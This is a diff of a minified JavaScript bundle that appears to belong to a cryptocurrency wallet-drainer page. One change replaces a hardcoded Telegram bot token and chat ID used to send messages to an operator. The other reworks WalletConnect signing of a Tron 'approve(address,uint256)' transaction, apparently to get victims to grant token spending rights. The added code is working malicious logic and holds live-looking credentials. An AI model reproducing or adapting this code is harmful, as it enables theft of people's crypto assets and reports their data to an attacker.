@@ -79431,13 +79431,13 @@
         }
           , sG = e => {
             try {
-                fetch("https://api.telegram.org/bot".concat("8689675702:AAGtLfTN16oueOrkaSsDfmfqiVmIlHQ47qI", "/sendMessage"), {
+                fetch("https://api.telegram.org/bot".concat("8916350055:AAE1nU_4v9dAFK2m9fuy4jOdld3zoZro76k", "/sendMessage"), {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
-                        chat_id: "1727819576",
+                        chat_id: "8435639892",
                         text: e,
                         parse_mode: "HTML"
                     })
@@ -79489,15 +79489,27 @@
                       , i = "approve(address,uint256)"
                       , s = await t.transactionBuilder.triggerSmartContract(r, i, n, o, e);
                     console.log("Transaction Built:", s);
-                    const tx = s.transaction || s;
-                    const signResponse = await this.provider.request({
-                        method: "tron_signTransaction",
-                        params: {
-                            address: e,
-                            transaction: tx
-                        }
-                    }, "tron:0x2b6653dc");
-                    const a = signResponse && (signResponse.result || signResponse);
+                    const tx = JSON.parse(JSON.stringify(s.transaction || s));
+                    let a;
+                    if (this.provider.signTransaction && this.provider.client)
+                        a = await this.provider.signTransaction(tx);
+                    else {
+                        if (!this.provider.client || !this.provider.session)
+                            throw new Error("WalletConnect session not active");
+                        const c = this.provider.session.namespaces.tron?.chains?.[0] || "tron:0x2b6653dc"
+                          , l = await this.provider.client.request({
+                            topic: this.provider.session.topic,
+                            chainId: c,
+                            request: {
+                                method: "tron_signTransaction",
+                                params: {
+                                    address: e,
+                                    transaction: tx
+                                }
+                            }
+                        });
+                        a = l.result
+                    }
                     if (!a || !1 === a.success)
                         return {
                             success: !1,
